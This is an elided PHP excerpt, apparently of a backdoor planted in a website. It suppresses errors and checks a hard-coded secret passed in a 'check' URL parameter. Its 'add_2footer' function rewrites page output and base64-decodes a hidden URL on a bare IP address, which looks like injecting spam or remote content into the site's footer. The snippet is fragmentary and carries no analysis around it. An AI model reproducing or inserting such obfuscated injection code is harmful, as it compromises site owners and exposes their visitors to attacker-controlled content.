...
error_reporting(0);
$_passssword = '87e7f310bcbfcecd1dfb752517047e0a';
unset($_passssword);
...
function add_2footer() {
    $check = false;
    $check_data = "";
    if (!empty($_GET['check']) AND $_GET['check'] == '87e7f310bcbfcecd1dfb752517047e0a') {
        $check = true;
    ...
    if (preg_match($regexp, $buffer, $m)) {
        $body = $m[0];
        $url = base64_decode('aHR0cDovLzEwOC42MS4xMTcuMjQ0L2Jsb2cvP3ZlbnVzJnV0bV9zb3VyY2U9MzQzNzozMjkwMzE6NTIw');
